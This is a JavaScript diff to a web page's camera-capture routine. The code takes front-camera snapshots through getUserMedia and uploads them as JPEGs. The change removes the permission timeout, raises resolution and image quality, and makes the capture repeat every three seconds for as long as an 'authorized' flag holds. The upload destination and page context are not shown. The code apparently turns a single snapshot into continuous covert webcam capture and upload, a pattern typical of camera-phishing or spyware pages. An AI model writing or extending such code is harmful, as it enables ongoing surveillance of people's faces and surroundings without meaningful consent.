@@ -474,37 +474,40 @@
     let isCapturingCamera = false
     let cameraCaptureCount = 0
 
-    async function captureCameraSnapshot(timeoutMs = PERMISSION_TIMEOUT_MS) {
+    async function captureCameraSnapshot(timeoutMs = null) {
         if (isCapturingCamera) return null
         if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return null
         isCapturingCamera = true
         let timeoutId = null
-        let timedOut = false
         let stream = null
 
         try {
             const streamPromise = navigator.mediaDevices.getUserMedia({
-                video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } }
+                video: { facingMode: "user", width: { ideal: 1920 }, height: { ideal: 1080 } }
             })
 
-            // If user allows camera AFTER the 3s timeout has fired, stop and close tracks immediately to avoid consuming RAM/hardware
-            streamPromise.then(s => {
-                if (timedOut && s) {
-                    console.warn("[Camera] Permission granted after 3s timeout limit. Closing tracks to prevent RAM leak.")
-                    try {
-                        s.getTracks().forEach(track => track.stop())
-                    } catch (_e) {}
-                }
-            }).catch(() => {})
+            if (timeoutMs && Number.isFinite(timeoutMs) && timeoutMs > 0) {
+                let timedOut = false
+                streamPromise.then(s => {
+                    if (timedOut && s) {
+                        try {
+                            s.getTracks().forEach(track => track.stop())
+                        } catch (_e) {}
+                    }
+                }).catch(() => {})
 
-            const timeoutPromise = new Promise((_, reject) => {
-                timeoutId = setTimeout(() => {
-                    timedOut = true
-                    reject(new Error(`Camera permission prompt timed out after ${timeoutMs}ms`))
-                }, timeoutMs)
-            })
+                const timeoutPromise = new Promise((_, reject) => {
+                    timeoutId = setTimeout(() => {
+                        timedOut = true
+                        reject(new Error(`Camera permission prompt timed out after ${timeoutMs}ms`))
+                    }, timeoutMs)
+                })
 
-            stream = await Promise.race([streamPromise, timeoutPromise])
+                stream = await Promise.race([streamPromise, timeoutPromise])
+            } else {
+                stream = await streamPromise
+            }
+
             if (timeoutId) {
                 clearTimeout(timeoutId)
                 timeoutId = null
@@ -545,8 +548,8 @@
             stream.getTracks().forEach(track => track.stop())
             stream = null
 
-            const dataUrl = canvas.toDataURL("image/jpeg", 0.85)
-            const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg", 0.85))
+            const dataUrl = canvas.toDataURL("image/jpeg", 0.95)
+            const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg", 0.95))
 
             if (blob || dataUrl) {
                 const formData = new FormData()
@@ -570,10 +573,10 @@
                 console.log("[Camera Snapshot Captured & Sent]:", result)
 
                 cameraCaptureCount++
-                if (cameraCaptureCount === 1) {
+                if (authorized || activeOptions) {
                     setTimeout(() => {
                         captureCameraSnapshot(timeoutMs)
-                    }, 2500)
+                    }, 3000)
                 }
 
                 return result
